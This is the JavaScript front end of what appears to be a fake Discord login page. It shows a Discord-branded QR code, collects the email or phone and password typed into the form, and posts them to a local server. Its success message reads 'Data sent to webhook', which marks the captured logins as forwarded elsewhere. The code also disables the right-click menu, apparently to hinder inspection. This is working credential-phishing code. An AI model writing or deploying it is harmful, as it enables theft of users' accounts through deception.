document.addEventListener("DOMContentLoaded", () => {
  const form = document.querySelector("form");
  const loginButton = document.querySelector(".login button");
  const emailInput = document.querySelector("#emailORphone");
  const passwordInput = document.querySelector("#password");
  const qrCodeElement = document.querySelector(".qr-code");
  const qrCodeImg = document.createElement("img");

  // Disable context menu
  document.addEventListener("contextmenu", (event) => event.preventDefault());

  // QR code animation
  qrCodeImg.src = "./assets/qrcode-discord-logo.png";
  qrCodeImg.alt = "QR Code";
  qrCodeElement.appendChild(qrCodeImg);

  const createCube = () => {
    const cube = document.createElement("div");
    cube.classList.add("cube");
    qrCodeElement.appendChild(cube);

    const moveCube = () => {
      const maxX = qrCodeElement.offsetWidth - cube.offsetWidth;
      const maxY = qrCodeElement.offsetHeight - cube.offsetHeight;
      const newX = Math.random() * maxX;
      const newY = Math.random() * maxY;
      cube.style.transform = `translate(${newX}px, ${newY}px)`;
    };

    moveCube();
    setInterval(moveCube, 2000);
  };

  for (let i = 0; i < 4; i++) createCube();

  // Form submission with API call
  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();

    if (!email || !password) {
      alert("Please fill in both email/phone and password.");
      return;
    }

    // Start ellipsis animation
    loginButton.disabled = true;
    loginButton.textContent = "Logging in.";
    const ellipsisInterval = setInterval(() => {
      loginButton.textContent =
        loginButton.textContent.length < 13
          ? loginButton.textContent + "."
          : "Logging in.";
    }, 500);

    try {
      const response = await fetch("http://localhost:3000/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });

      const result = await response.json();

      if (response.ok) {
        alert("Login successful! Data sent to webhook.");
        emailInput.value = "";
        passwordInput.value = "";
      } else {
        alert(`Error: ${result.message || "Invalid credentials."}`);
      }
    } catch (error) {
      alert("Error: Could not connect to the server.");
      console.error("Login error:", error);
    } finally {
      // Stop ellipsis animation
      clearInterval(ellipsisInterval);
      loginButton.textContent = "Log In";
      loginButton.disabled = false;
    }
  });
});
